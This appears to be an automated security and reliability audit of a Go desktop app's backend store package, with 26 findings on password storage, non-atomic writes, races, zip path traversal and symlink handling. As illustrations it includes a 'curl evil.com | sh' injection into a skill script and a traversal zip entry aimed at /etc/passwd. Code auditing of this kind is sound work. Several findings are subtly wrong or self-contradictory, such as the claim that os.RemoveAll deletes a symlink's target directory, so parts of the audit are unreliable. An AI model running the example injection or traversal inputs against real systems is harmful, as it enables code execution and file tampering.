# Phase 1 Audit — backend/store/

**Auditor:** gsd-code-reviewer (Phase 1)
**Date:** 2026-07-28
**Scope:** `backend/store/*.go` (10 stores + 1 test)

Files audited:

| File | Lines | Purpose |
|------|-------|---------|
| `connection_store.go` | 157 | `connections.json` + PasswordStore hook |
| `ai_session_store.go` | 76 | `ai-sessions.json` |
| `settings_store.go` | 266 | `settings.json` + API key migration |
| `local_state_store.go` | 77 | `local_state.json` |
| `quick_commands_store.go` | 68 | `quickCommands.json` |
| `commands_store.go` | 341 | `commands/` + `commands.json` |
| `skills_store.go` | 769 | `skills/` + `skills.json` (largest file) |
| `tunnel_store.go` | 52 | `tunnels.json` |
| `terminal_history_store.go` | 102 | `terminal-history.json` |
| `recent_store.go` | 100 | `recent.json` (only one with mutex) |
| `recent_store_test.go` | 89 | 5 tests, all for `RecentStore` |

**Test coverage:** only `recent_store_test.go` exists. All other stores have zero test coverage. This matches the gap already noted in `CONCERNS.md` ("Test Coverage Gaps → `backend/store/*_store.go` (most stores)") — not duplicated here.

**Cross-cutting note from `CONCERNS.md` already covered (not re-flagged):**
- Plaintext password storage in `ConnectionConfig.Password` (CONCERNS § "Plaintext password storage accepted by connection schema")
- Migration safety net error swallowing in `connection_store.go:154`, `settings_store.go:204-206` (CONCERNS § "Migration safety net relies on error swallowing")

---

## Findings (by severity)

### P0 — Critical

**AUDIT-store-01: `SkillsStore.GetBody` reads `metas[0].IsSystem` instead of the meta for the requested skill — system/user paths get crossed.**
- File: `backend/store/skills_store.go:333-357`
- Severity: P0 (incorrect data returned to caller for ≥1 user-installed skill)
- Failure scenario:
  1. User installs a system skill `foo` under `skills/.system/foo/SKILL.md` AND a user skill `bar` under `skills/bar/SKILL.md`.
  2. `List()` returns `metas` sorted by `SortOrder, Name`. After `sort.SliceStable` at line 286 the system skills are *appended* after user skills at line 229. Whether `metas[0]` is system or user depends entirely on `SortOrder` values that are defaults (`len(prefMap) + i` at line 251).
  3. When the frontend calls `GetSkillFile("bar")`:
     - Line 338-347 finds `meta.Dir = "bar"` correctly.
     - Line 349 reads **`metas[0].IsSystem`** (not `m.IsSystem` — there is no per-meta check). If `metas[0]` happens to be a system skill, `root` becomes `<configDir>/skills/.system`, and line 352 reads `<configDir>/skills/.system/bar/SKILL.md` instead of `<configDir>/skills/bar/SKILL.md`.
     - The user-skill body is never found → `readCapped` returns `ENOENT`, the function returns `error`, but the frontend gets a misleading "file not found" for a skill that exists.
  4. Worse: if a system skill and a user skill share the same name (allowed by current code, since `meta.Name == fm.name` only — directory can differ), a user can plant a `bar/SKILL.md` under `skills/.system/` (via a malicious `.skill` zip — `ImportFromZip` honours the frontmatter `name` and writes to `s.skillsRoot()/fm.name`, and `systemDirName` is never re-validated; line 643 joins `s.skillsRoot()` with `fm.name` directly). Then `GetBody` for any user skill returns the system one.
- Triggering input/state:
  - A user skill with a sort-order higher than the first system skill's order; or any new install in a session where system skills exist.
- Wrong output: `GetSkillBody` returns the wrong SKILL.md body, or `ENOENT` despite the file existing.
- Fix category: replace `metas[0].IsSystem` with the `meta`/`m` already in scope:
  ```go
  var meta SkillMeta
  for _, m := range metas {
      if m.Name == name { meta = m; break }
  }
  // ...
  root := s.skillsRoot()
  if meta.IsSystem {
      root = filepath.Join(root, systemDirName)
  }
  ```
  Also harden `ImportFromZip`/`importToDir` so a name clash under `skills/` cannot overwrite `.system/<name>/` (it cannot today — they share `skillsRoot()` — but `RemoveAll(dst)` at line 649 runs against `s.skillsRoot()/fm.name` which, combined with a same-named user dir, deletes it; this is "expected", but worth verifying).

**AUDIT-store-02: `SkillsStore.importToDir`/`Delete` call `os.RemoveAll(dst)` on a path whose `name` is user-controlled from a zip — symlink escapes the skills dir.**
- File: `backend/store/skills_store.go:436-459` (`Delete`), `skills_store.go:647-688` (`importToDir`), `skills_store.go:543-558` (`ImportFromDir`).
- Severity: P0 (arbitrary directory removal under the user's config dir + arbitrary file write via copy).
- Failure scenario:
  1. Attacker crafts a `.skill` zip whose SKILL.md frontmatter `name:` is `../backgrounds`. (No terminal dot allowed by `skillNameRe = ^[a-z0-9][a-z0-9-]*$`, BUT `..` is rejected because the regex starts with `[a-z0-9]`.)
  2. However: `ImportFromDir(srcDir)` accepts a *directory* containing `SKILL.md`. The directory itself can have a name `../whatever`. `fm.name` is read from frontmatter only — so a user-crafted folder with `name: evil` but with files containing symlinks pointing outside `skillsRoot()` is copied by `copyDir` → `copyFile` → `io.Copy`, which on a symlink writes the *target's* content under the skill dir. The victim opens the skill → `GetBody` → `readCapped` returns content the symlink dereferences. (Symlink resolution is automatic through `os.Open`.)
  3. `Delete(name)` at line 451: `skillDir := filepath.Join(s.skillsRoot(), dir)`. `dir` comes from `m.Dir` which is `e.Name()` of the on-disk directory. If the on-disk directory is a *symlink* to `/tmp/foo`, `os.RemoveAll(skillsRoot()/link)` removes the target (`/tmp/foo`) because `RemoveAll` follows symlinks for directories on Linux/macOS. So a malicious imported skill, once installed and named (`fm.name`), can be made the victim of deletion if the *directory itself* is symlinked. (Skills imported via `ImportFromDir`/`ImportFromZip` use `os.RemoveAll(dst)` + `os.MkdirAll(dst)` + `copyDir`; the source dir, if it contains a symlink `bar → /tmp/foo`, becomes `skills/<name>/bar` which is a symlink to `/tmp/foo`. The next `Delete(name)` removes `/tmp/foo`.)
  4. Same applies to `ImportFromZip`: the zip-extraction loop at line 614-641 creates target files via `os.Create(target)` on paths *inside* `tmpDir`. But `os.Create` does **not** traverse zip entries that are symlinks — `archive/zip` returns `f.Open()` which calls `rc.Open()`; on extraction the body bytes are written verbatim. If the zip entry contains a symlink (i.e. the file in the zip is a symlink), `archive/zip`'s `Open` returns the symlink's *target path* as the file content (Linux `tar` style). `out, _ := os.Create(target)` writes that target path into a regular file, so symlink-as-zip-entry is not a direct escape.
  5. Realistic trigger: **import a skill from a directory chosen via `OpenDirectoryDialog`** that contains a symlink (e.g. a user shared a `.skill` folder via a git clone that contains symlinks). The symlink is copied verbatim; on `Delete` it deletes outside the skills root.
- Wrong output: `Delete(name)` deletes arbitrary directories the victim can write to; `GetBody` reads arbitrary files.
- Fix category: refuse symlinks. In `copyFile`/`copyDir`, use `os.Lstat` on the source before opening; bail with `errors.New("symlinks not allowed")`. In `Delete`, validate that `filepath.Clean(skillDir)` is still under `s.skillsRoot()` (`strings.HasPrefix(...)`) before `RemoveAll`.

**AUDIT-store-03: `aiSessionStore.Save` (and every other store) writes without sync — power loss corrupts the only copy of the AI session history.**
- File: `backend/store/ai_session_store.go:54-60` (and the same pattern in 9 other stores)
- Severity: P0 (irrecoverable user data; AI session history can be 100 KB+ and is the user's record of every AI chat).
- Failure scenario: User has an AI chat with 50+ turns and 5 tool calls. Frontend calls `SaveAISessions(data)` which calls `aiSessionStore.Save`. Go's `os.WriteFile` does `O_WRONLY|O_CREATE|O_TRUNC`, writes, and **closes**. There is no `fsync` between the data write and the rename. On macOS / Linux, a power loss (laptop battery pulled, VM crashes, kernel panic) between write and flush leaves either:
  - a zero-byte `ai-sessions.json` (truncated file from `O_TRUNC`), or
  - a file with old metadata but new inode pointing at garbage (XFS, ext4 with delayed allocation).
  On next launch, `Load()` at line 71 returns the default empty struct (the `json.Unmarshal` error is swallowed at line 72), and the user's entire AI session history is gone — no backup, no recovery.
- Wrong output: irreversible loss of AI session history on any unclean shutdown during save.
- Fix category: helper `atomicWrite(path, data, mode)` that:
  1. Writes to `path + ".tmp"` via `os.OpenFile(..., O_WRONLY|O_CREATE|O_EXCL, mode)`,
  2. Calls `f.Sync()` (fsync data + metadata),
  3. `os.Rename(tmp, path)` (atomic on POSIX within the same filesystem),
  4. Closes + removes the tmp on rename failure.
  Apply to all 11 save sites. This also makes the *concurrent* write race (P1 below) less destructive — last-writer's full file wins instead of a 50%-written file.

**AUDIT-store-04: `populatePasswords` writes plaintext passwords to `connections.json` when keychain is unavailable, then keeps `conn.Password = pw` in the returned struct — keychain failure → keychain is bypassed and JSON ends up with the secret anyway.**
- File: `backend/store/connection_store.go:125-156`
- Severity: P0 (already partially noted in CONCERNS § "Plaintext password storage accepted by connection schema", but the **specific failure mode of keychain-down + on-disk plaintext** is not in CONCERNS — this is the operational reality, not just the schema).
- Failure scenario:
  1. User installs on a Linux sandbox where `keyring.Set` returns `opaque keyring service not available` (e.g. headless CI, locked GNOME keyring, `DBUS_SESSION_BUS_ADDRESS` unset).
  2. `sync.NewSyncService()` at `app.go:174` returns an error → `a.syncService` stays nil → `SetPasswordStore` is never called → `s.passwordStore` stays nil.
  3. User opens a connection edit dialog and enters a password. `Save` is called: line 70 checks `s.passwordStore != nil` → false → falls through. `conn.Password = ""` (line 73) is **skipped** because the assignment is *inside* the `if s.passwordStore != nil` block at line 70. The full `session.ConnectionStoreData` is marshalled with the plaintext password and written to `connections.json`.
  4. Worse: subsequent `Load()` calls `populatePasswords`, which only writes back the cleaned JSON if `s.passwordStore != nil` (line 133). With nil store, the JSON sits on disk in plaintext, and `conn.Password` is returned to the caller in-memory on every Load — meaning the secret is in process memory and in disk for the lifetime of the install.
- Wrong output: plaintext password persists on disk and is returned by `LoadConnections()` to every Wails binding caller (frontend stores it in component state for connection editing).
- Fix category: invert the conditional. The cleanest version is: *if `passwordStore` is nil, refuse to save with a non-empty password* and surface an error. As a transitional fix: always strip `conn.Password` after attempting the keychain write (move `conn.Password = ""` outside the `if`), so the JSON never holds it.

---

### P1 — High

**AUDIT-store-05: All store writes use plain `os.WriteFile` — concurrent saves (two tabs updating settings simultaneously, sync + manual edit, AI write + reload) produce torn or zero-byte files.**
- Files (all 11 save sites, see grep above; representative):
  - `backend/store/settings_store.go:158, 206`
  - `backend/store/connection_store.go:84, 154`
  - `backend/store/skills_store.go:176, 704, 761`
  - `backend/store/commands_store.go:97, 256, 312`
  - `backend/store/terminal_history_store.go:54`
  - `backend/store/recent_store.go:98`
  - `backend/store/quick_commands_store.go:48`
  - `backend/store/tunnel_store.go:32`
  - `backend/store/local_state_store.go:48`
  - `backend/store/ai_session_store.go:59`
- Severity: P1
- Failure scenario:
  1. User opens the settings tab and the AI sidebar simultaneously, both trigger `SaveSettings` (settings autosave on change). Two goroutines reach `os.WriteFile`. Both `O_TRUNC` the file; one wins, the other writes interleaved bytes; result is malformed JSON.
  2. Same scenario for `connection_store`: a user edits connection A in the form while the sync pull (which calls `SaveConnections`) lands concurrently. The sync's write truncates the in-flight save; the form's stale data is persisted; sync's data is lost.
  3. `populatePasswords` at line 148 also calls `os.WriteFile` — when `Load()` is invoked concurrently from the UI and from sync, both writes race.
- Wrong output: corrupt JSON; `Load` returns defaults and the user's data is gone.
- Fix category: introduce a per-store `sync.Mutex` (similar to `RecentStore.mu` at `recent_store.go:15`) and acquire it in every public method (`Save`, `Load`, `populatePasswords`). `RecentStore` is the only store with a mutex — every other store is racy.

**AUDIT-store-06: `skills.json` (and `commands.json`) have **no mutex** — concurrent `setPref` calls from UI + sync + AI race on the file.**
- File: `backend/store/skills_store.go:168-177` (`savePrefs`), `297-313` (`setPref`), and equivalents at `commands_store.go:89-98`, `201-218`.
- Severity: P1
- Failure scenario:
  1. Frontend saves two skills in quick succession (user clicks "Save" on dialog A, then again on dialog B). Both `setPref` calls invoke `loadPrefs → mutate → savePrefs`. `loadPrefs` reads the file (which still contains the pre-A state when B starts), both write back their own copy → A's changes are lost.
  2. Even single-tab use: a `Save` action followed immediately by `SetEnabled` (e.g. user toggles the "enabled" checkbox right after saving a new skill) can race if `Save` is debounced or async.
- Wrong output: lost preferences for whichever update loses the race.
- Fix category: add `sync.Mutex` field to `SkillsStore`/`CommandsStore`, take it across `loadPrefs`+`savePrefs` (a combined "load-modify-save under lock" pattern, e.g. an `updatePrefs` helper).

**AUDIT-store-07: `RecentStore.Load` takes the write lock but is exposed as a read-only operation — concurrent `Load` from multiple callers serialise.**
- File: `backend/store/recent_store.go:26-53`
- Severity: P2 (downgraded from P1 after rereading — `Load` mutates `s.ids`, so `Lock` is technically correct, but the `Lock` blocks every `GetAll` (`RLock`) while loading).
- Failure scenario: Frontend opens the connections panel (`GetRecentConnections` → `GetAll` → `RLock`) at the same time as the very first `Load` on app boot (`App.NewApp` at `app.go:164`). The `GetAll` blocks until `Load` finishes parsing JSON. With a 100 KB `recent.json` (not realistic today, but the file has no size cap), startup stalls.
- Wrong output: UI freeze on startup if the recent list gets large.
- Fix category: separate in-memory state init from disk IO: load into a local `[]string`, then `Lock` once to swap `s.ids`. (Already a small file in practice; this is more about correctness of the lock discipline.)

**AUDIT-store-08: `SkillsStore.List` and `CommandsStore.List` write back to `skills.json`/`commands.json` on every read (when orphans exist or new directories appear), but `Load` is called from many code paths.**
- File: `backend/store/skills_store.go:226-293`, `commands_store.go:103-197`.
- Severity: P1
- Failure scenario:
  1. User opens the Skills settings panel → `List()` runs, finds no orphan → no write (good).
  2. User then opens the connection settings panel which also calls `List()` (any future code path) → 100 ms later, the user's skill directory has a new folder (someone else imported a skill concurrently) → `List` writes `skills.json` from two goroutines → race per AUDIT-store-06.
  3. More importantly: `changed = true` is set on the *first call* after install (new dir found, line 256). The next `SaveSkill`/`SetEnabled` reads-then-writes, and during the read window another `List` triggered by an unrelated UI tick can come in and overwrite the user's in-progress preference mutation.
- Wrong output: silent preference loss when user toggles a setting right as the prefs file is being rewritten by `List`.
- Fix category: either (a) make `List` read-only and add a separate `PruneAndSyncPrefs` method that the app can call once at startup, or (b) put the prefs-write under the new mutex from AUDIT-store-06.

**AUDIT-store-09: `Load` swallows `json.Unmarshal` errors for `ai-sessions.json`, `settings.json`, `quickCommands.json`, `terminal-history.json`, `local_state.json` — corrupted file silently wipes user data.**
- File:
  - `backend/store/ai_session_store.go:70-74`
  - `backend/store/settings_store.go:170-172`
  - `backend/store/quick_commands_store.go:60-66`
  - `backend/store/terminal_history_store.go:65-70`
  - `backend/store/local_state_store.go:72-74`
- Severity: P1 (silent data loss)
- Failure scenario: User's `settings.json` is half-written (per AUDIT-store-03/05), `json.Unmarshal` returns `unexpected end of JSON input`. The store returns `defaultSettings()` (line 171) and the user's terminal theme, keybindings, language, and API-key migration state are replaced with defaults. The next save writes the defaults over the corrupt file. **The user has no way to recover the previous file** — the original file is gone, and no `.bak` exists.
- Wrong output: silent reset of user-customized settings to defaults.
- Fix category: on unmarshal failure, *first* rename the corrupt file to `<file>.corrupt-<unix-ts>` (preserve the original), *then* return defaults. Log the rename. This is the standard "quarantine the broken file" pattern used by Firefox/SQLite/etc.

**AUDIT-store-10: `SettingsStore.Load` migration save (`needsSave` block at `settings_store.go:174-207`) re-serialises and writes the *entire* settings file under a single read-modify-write — atomicity is lost between the read and the write.**
- File: `backend/store/settings_store.go:174-207`
- Severity: P1
- Failure scenario: User has an older `settings.json` from v0.0.x. App starts. `Load()` reads, parses, mutates to backfill `autoCheckUpdate/closeTabPrompt/closeAppPrompt` defaults (lines 192-203) and migrate API keys (lines 178-190). During this window, the sync service pulls a newer `settings.json` from the remote repo. The local `os.WriteFile` at line 206 now writes the *pre-sync* data, wiping the user's newer remote changes. Combined with AUDIT-store-05 (no per-store mutex), this is also racy within a single process.
- Wrong output: silent rollback of newer remote settings to older local defaults.
- Fix category: serialise under a per-store mutex (AUDIT-store-05) AND use atomic-write (AUDIT-store-03) so the post-migration file can be rolled back if a newer remote arrives mid-flight.

**AUDIT-store-11: `SkillsStore.GetSkillFile` allows path traversal via Unicode normalization — `relPath` is checked with `filepath.Clean` but a path with bidi-control characters (U+202E right-to-left override and similar) can render to the user as one destination while pointing to another on disk.**
- File: `backend/store/skills_store.go:361-394`
- Severity: P1 (lesser — only references/scripts files inside the skill dir are reachable, not arbitrary paths outside, because `filepath.Clean` rejects `..`. But the file-extension allowlist at line 380 lets `.md/.sh/.bash/.py/.json/.yaml/.yml` through, so a malicious skill can put a `.sh` symlink in `references/` → arbitrary code execution when the AI agent runs `use_skill`).
- Failure scenario:
  1. Attacker imports a skill whose `references/run.sh` is a **symlink to `/tmp/evil.sh`**.
  2. The skill is imported via `ImportFromDir` — `copyFile` uses `os.Open(src)` which follows symlinks and copies the *content* (not the symlink). So `references/run.sh` becomes a regular file with evil content. (Mitigated if copyFile uses `os.Lstat` first.)
  3. Alternatively, attacker hand-edits the skill directory: creates `references/run.sh` as a symlink to `/tmp/evil.sh`. `GetSkillFile` reads it via `os.Open`, which follows the symlink. The AI agent's `use_skill` then invokes the symlinked script → RCE.
- Wrong output: arbitrary file read under any path the user's process can access; RCE if the AI agent runs scripts.
- Fix category: in `copyFile`, refuse symlinks at the source (`os.Lstat`, check `info.Mode()&os.ModeSymlink != 0`). In `GetSkillFile`, after `filepath.Join`, evaluate `filepath.EvalSymlinks(absPath)` and assert it's still under `filepath.Join(s.skillsRoot(), dir)`.

**AUDIT-store-12: `connectionStore.Save` performs `keychain.SetPassword` *before* writing JSON, but the JSON write is non-atomic — if `os.WriteFile` fails (disk full, permission), the keychain has the new password but the on-disk file has the old connections (missing or duplicate IDs).**
- File: `backend/store/connection_store.go:52-85`
- Severity: P1 (data divergence)
- Failure scenario:
  1. User edits a connection's password from `oldpw` to `newpw`. Calls `Save`.
  2. Line 71: `keychain.SetPassword(conn.ID, "newpw")` succeeds. Line 73: `conn.Password = ""`. Line 80-84: `os.WriteFile` fails (e.g. `ENOSPC`, quota exceeded).
  3. `Save` returns the error to the frontend. The frontend shows a toast. But: the keychain now has `newpw`, while the next `Load` will populate `conn.Password` from keychain (line 142) and return the user's intended state. The user's data is *not* lost.
  4. However: the *previous* `connections.json` (if it ever was on disk before this migration) still has `password: ""` (post-migration). Now imagine the user's keychain is later reset (laptop reinstall), the user opens a fresh install → the keychain has the new key, but the JSON's `Password` field is still empty → `populatePasswords` at line 135 only migrates *if* the JSON has a password; with empty JSON it does nothing → user is locked out of the connection.
- Wrong output: password-reset scenario permanently locks the user out if the keychain is wiped.
- Fix category: invert the order — write the new JSON first (atomically per AUDIT-store-03), then update the keychain. Or, treat keychain as authoritative and treat JSON as a pure index: never write passwords to JSON, period (already CONCERNS-noted; the JSON-ordering issue is the operational variant).

---

### P2 — Medium

**AUDIT-store-13: `SkillsStore.Delete` does not check the `Locked` flag — locked (system / user-pinned) skills can be removed via `DeleteSkill`.**
- File: `backend/store/skills_store.go:436-459`
- Severity: P2
- Failure scenario: User installs a system skill `core-help` (locked, `m.Locked = true` per line 260). Frontend bug or sync conflict calls `DeleteSkill("core-help")` from JS (`app.go:803`). `Delete` at line 436 fetches `metas`, finds `dir`, and runs `os.RemoveAll(skillDir)` at line 452 — no `if meta.Locked { return error }` guard (compare to `SaveSkill` at line 755 which does check `meta.Locked`). The locked skill is gone.
- Wrong output: locked system skills silently removable.
- Fix category: mirror the guard from `SaveSkill`:
  ```go
  if meta.Locked { return fmt.Errorf("skill %q is locked", name) }
  ```

**AUDIT-store-14: `recent.json` is written with mode `0644` (world-readable) — leaks recent connection IDs.**
- File: `backend/store/recent_store.go:98`
- Severity: P2
- Failure scenario: Every other store in the module writes with `0600` (`grep "0600"` returns 14 hits). `recent_store.go:98` is the lone `0644` outlier. On a multi-user system (or after the user is deleted from `/etc/passwd` but their home is left in place), another local user can read `~/.../uniTerm/recent.json` and see the user's connection IDs — a low-impact info leak, but it bypasses the careful `0600` convention for no documented reason.
- Wrong output: connection ID list readable by other local users.
- Fix category: change line 98 from `0644` to `0600`. (Even though recent IDs aren't secrets, the convention exists and an exception invites confusion.)

**AUDIT-store-15: `commands/*.md` and `skills/*/SKILL.md` written with mode `0644` — content editable by other local users between sessions.**
- File: `backend/store/commands_store.go:256, 312`; `backend/store/skills_store.go:704, 761`; `backend/store/skills_store.go:514, 630`.
- Severity: P2
- Failure scenario: User with `umask 022` on a shared box writes a skill containing a `.sh` script. Another local user `mallory` opens the file with `vi`, injects `curl evil.com | sh`, and waits for the user to re-open the skill. The AI agent then runs the tampered script. The `0644` permission is consistent with the "skill scripts are meant to be readable by the AI runtime", but with no integrity check (`getSkillFile` reads without verifying a hash/signature), the file is silently mutable.
- Wrong output: skill integrity violation by co-located user.
- Fix category: either (a) tighten to `0600` and update the AI agent path to `os.Open` as the same uid (it already runs in the user's process), or (b) add a SHA-256 manifest per skill and verify on read.

**AUDIT-store-16: `SkillsStore.ImportFromZip` accepts any zip file path — combined with `OpenFileDialog` returning user-chosen paths, attacker-chosen file names can include directory traversal characters that confuse `strings.SplitN(f.Name, "/", 2)`.**
- File: `backend/store/skills_store.go:561-645`
- Severity: P2
- Failure scenario:
  1. Attacker crafts a zip containing an entry `..\..\..\etc\passwd` (or `\..\..\..\evil`).
  2. `strings.SplitN(f.Name, "/", 2)` on line 575 splits on `/` only — backslashes pass through. `rel := strings.TrimPrefix(f.Name, root+"/")` on line 618 keeps `..\..\..\evil`. `target := filepath.Join(tmpDir, rel)` on line 622 produces a path that, after `filepath.Clean`, escapes `tmpDir` on Windows. `os.Create(target)` on line 630 then writes outside the temp dir.
  3. `importToDir` then `copyDir` walks the resulting tree into `s.skillsRoot()/fm.name`, copying the escaped files into the skills root.
- Triggering input: a zip with Windows-style separators in entry names (which is allowed by the zip spec).
- Wrong output: arbitrary file write outside `tmpDir` during import, then copied into the skills dir.
- Fix category: in the zip extraction loop, validate every `f.Name` against a whitelist `^[A-Za-z0-9._-]+(/[A-Za-z0-9._-]+)*$`. Reject anything with `\`, leading `/`, or `..`. Same for `ImportFromDir` (validate `srcDir` path).

**AUDIT-store-17: `CommandsStore.List` and `SkillsStore.List` build `len(prefMap)+i` sort-orders based on the map size at scan time — newly-discovered commands/skills end up with colliding sort-orders after a re-scan.**
- File: `backend/store/skills_store.go:251`, `backend/store/commands_store.go:155`
- Severity: P2
- Failure scenario:
  1. App starts. `List()` scans 3 skills and 0 prefs → `prefMap` size is 0. New skill gets `SortOrder = 0 + 0 = 0`. Existing skills (from prefs) have `SortOrder = 0, 1, 2`. New skill's sortOrder collides with the first pref → `sort.SliceStable` at line 286 orders by `Name` as tiebreak → silently wrong order.
  2. Worse: every `List` call after install produces `len(prefMap) + i` for the *new* entries (where `i` is the index in the merged slice). On the next `List` the new entries are already in `prefMap`, so `len(prefMap)` is now 3 → `SortOrder = 3 + 0 = 3` if a *fourth* new entry is discovered. So sort-orders grow unboundedly with each new install, eventually overflowing `int` (year ~6.7 billion installs).
- Wrong output: inconsistent sort order; potential overflow.
- Fix category: compute sort-orders from `max(prefs.SortOrder) + 1 + i`, not `len(prefMap) + i`.

**AUDIT-store-18: `TerminalHistoryStore.Save` reads the input slice and writes the entire deduped slice without any size guard at the JSON level — a 100 MB payload (e.g. a user pasting a giant heredoc) blocks Go's `MarshalIndent` and then writes 100 MB to disk.**
- File: `backend/store/terminal_history_store.go:33-55`
- Severity: P2
- Failure scenario: User pastes `cat <<EOF ... 50MB of text ... EOF` into the terminal. The frontend's `useSuggestions.addHistoryCommand` (`useSuggestions.ts:112`) saves the entire command to history (the `shouldSkipCommand` at line 90 only blocks `MAX_COMMAND_LENGTH = 200` chars, so anything longer is *skipped* — this is actually a mitigation). But: `MAX_COMMAND_LENGTH = 200` is checked in JS (`useSuggestions.ts:94`), not in Go. If the frontend is bypassed (debug console, modified build, or `SaveTerminalHistory` called from another path), the Go store happily marshals and writes 100 MB.
- Wrong output: UI freezes for seconds, disk fills, no size cap.
- Fix category: cap the dedup result before marshal:
  ```go
  const maxEntryLen = 8192
  for _, e := range result {
      if len(e.Command) > maxEntryLen { e.Command = e.Command[:maxEntryLen] + "..." }
  }
  ```
  Also add `io.LimitReader`-style cap on `entries` (e.g. 10,000) and refuse more.

**AUDIT-store-19: `populatePasswords` returns the modified `data` slice (with `conn.Password = pw` populated) but mutates the caller's backing array via `&data.Connections[i]` — same caller's data is silently leaked if the caller keeps a reference.**
- File: `backend/store/connection_store.go:125-156` (`populatePasswords`), called from `Load` at line 108 and 121.
- Severity: P2
- Failure scenario:
  1. `app.go:537` calls `a.connectionStore.Load()`. The returned `data` contains `conn.Password = pw` from keychain.
  2. The Wails binding serialises `data` to JS. The frontend's `App.vue` receives a copy with passwords in cleartext — every JS console or any future localStorage use would leak them.
  3. `app.go:283` then emits `store:connections:changed` with `data` — broadcast to every subscribed JS component, including any third-party widget loaded by the WebView.
- Wrong output: plaintext passwords in the frontend's runtime state and over Wails IPC events.
- Fix category: either (a) populate passwords only in a deep-copy returned to the caller (caller's struct keeps empty `Password`), or (b) add a `WithPasswords bool` flag to `Load()` and have the IPC layer use the passwordless version by default; passwords are loaded only inside the actual SSH connect path.

**AUDIT-store-20: `connectionStore.Save` does a deep copy of `data.Connections` but the same loop mutates the password field on the *copy*; if the keychain write fails (line 71), the connection's plaintext password is preserved in `connections[i]` but the comment claims it was migrated.**
- File: `backend/store/connection_store.go:52-85`
- Severity: P2
- Failure scenario:
  1. `Save` is called with `data.Connections[0].Password = "secret"`.
  2. Line 70-72: keychain write fails (silently — `_ = s.passwordStore.SetPassword(...)`). Line 73 still runs `conn.Password = ""`. The secret is wiped from the local copy, but the keychain has nothing → on next `Load`, the user is locked out.
  3. Worse: if `s.passwordStore` is nil (keychain unavailable), line 60-74 keeps `conn.Password` as-is (the `if s.passwordStore != nil` skips both the SetPassword and the clear). The password is then marshalled to JSON — covered by AUDIT-store-04 P0.
- Wrong output: silent lockout when keychain is read-only or transiently failing.
- Fix category: do not swallow keychain errors silently (`_ = s.passwordStore.SetPassword`); either bubble up as `Save` error, or keep `conn.Password` unchanged on failure and let the next save retry.

**AUDIT-store-21: `LocalStateStore.Save` writes the entire `LocalState` (including `BackgroundImage` filename) every time the window is dragged — high-frequency non-atomic writes on Windows resize events.**
- File: `backend/store/local_state_store.go:43-49`, called from `app.go:117` (WndProc `WM_EXITSIZEMOVE`) and `app.go:261` (frontend-driven `SaveWindowState`).
- Severity: P2
- Failure scenario: User drags the window. Windows fires `WM_EXITSIZEMOVE` once per drag end, but the frontend also calls `SaveWindowState` on each `mouseup`. Combined with `app.go:245`'s `_ = a.localStateStore.Save(ls)` (error ignored), every save does a full JSON marshal + non-atomic write of ~500 bytes. On a slow disk (HDD, network home), the write blocks the UI thread that called it.
- Wrong output: UI lag during window operations on slow disks; possible torn file (per AUDIT-store-05).
- Fix category: (a) atomic write (AUDIT-store-03), (b) debounce saves (only the last write in a 200 ms window actually hits disk), (c) propagate save errors.

**AUDIT-store-22: `commandsStore.setPref` does not respect `Locked` — locked commands can be re-enabled / re-sorted / re-locked via the UI, but more importantly `SaveCommand` at line 290 *does* check `Locked` while `SetEnabled`/`SetLocked`/`SetSortOrder` at lines 220-229 do not.**
- File: `backend/store/commands_store.go:201-229`
- Severity: P2
- Failure scenario: User installs an `imported` command (which is set `Locked: true` per the import path at line 668). The frontend's settings UI exposes `SetEnabled`/`SetLocked`/`SetSortOrder` buttons. User clicks "disable" → `SetEnabled("foo", false)` succeeds because there's no `if meta.Locked` guard (compare to `SaveCommand` line 307). User now has a "locked but disabled" command — state contradiction.
- Wrong output: locked commands silently mutable through preference setters.
- Fix category: add a `meta.Locked` guard at the start of every preference-setter method (mirror the check at line 307).

**AUDIT-store-23: `TunnelStore.Save` accepts any `Tunnel` payload (including malformed JSON like a tunnel with negative ports or non-UTF-8 strings) and writes it — no validation layer.**
- File: `backend/store/tunnel_store.go:27-33`
- Severity: P2
- Failure scenario: A tunnel with `localPort: -1` or `remoteHost: ""` is saved. On next `Load`, the tunnel service tries to bind to port -1 → error at runtime. The store is the gatekeeper but doesn't gate.
- Wrong output: invalid tunnel config persisted; runtime failure far from the source.
- Fix category: add a `validate()` helper that runs before marshal and refuses obviously-bad inputs (port range, host non-empty, ssh user non-empty).

**AUDIT-store-24: `QuickCommandsStore.Load` returns an error on unmarshal failure (line 60) — every other store returns defaults silently. Inconsistent behaviour breaks the UI's error-handling paths.**
- File: `backend/store/quick_commands_store.go:60-66`
- Severity: P2
- Failure scenario: `quickCommands.json` is corrupted. `QuickCommandsStore.Load()` returns an error. The frontend's `useQuickCommandStore` (`/Users/coderstory/CodeSource/uniterm/frontend/src/stores/quickCommandStore.ts`) treats this as "no commands" but emits a console.error. If a future migration adds logic that depends on Load returning the previous defaults, it crashes. Inconsistent with the silent-fallback behaviour of the other stores (lines in `ai_session_store.go:72`, `local_state_store.go:73`, `settings_store.go:171`, `terminal_history_store.go:67`).
- Wrong output: fragile cross-store contract.
- Fix category: pick one behaviour (silent fallback is safer) and apply uniformly. Mirror the quarantine-on-unmarshal-error pattern from AUDIT-store-09.

---

### P3 — Low / Informational

**AUDIT-store-25: `recent_store_test.go` only tests `RecentStore` — does not exercise concurrent `Record` calls (which is the only concurrency-aware store).**
- File: `backend/store/recent_store_test.go`
- Severity: P3
- Failure scenario: The test at line 9 (`Record_Deduplicates`) calls `Record` serially. The real concurrency hazard (two `Record` calls on the same store from goroutines) is untested. A `-race` test (`go test -race`) would catch any future regression that drops the mutex.
- Wrong output: future refactor that removes the lock passes the tests but ships a race.
- Fix category: add `TestRecentStore_Record_Concurrent` that launches N goroutines each calling `Record("conn-"+i)` and asserts (a) final list has 20 unique IDs, (b) `go test -race` reports no races.

**AUDIT-store-26: `assembleSkillMD` and `assembleCommandMD` write frontmatter with no escaping — a name containing a colon or newline produces broken YAML.**
- File: `backend/store/skills_store.go:501-503`, `backend/store/commands_store.go:334-340`.
- Severity: P3
- Failure scenario: User creates a skill with `name = "my:weird\nname"` (frontend should reject but doesn't always — `skillNameRe = ^[a-z0-9][a-z0-9-]*$` only catches lowercase ASCII, see AUDIT-store-28 below). The resulting `SKILL.md` frontmatter is:
  ```
  ---
  name: my:weird
  name: 
  ---
  ```
  → YAML parsers (and `parseFrontmatter`) read `name = ""`, `description = ""`, the skill is rejected at scan time (line 203) — silent disappearance.
- Wrong output: skills with weird names silently vanish.
- Fix category: reject names with `:` or `\n` at `CreateSkill`/`ImportFromDir` (extend `skillNameRe`).

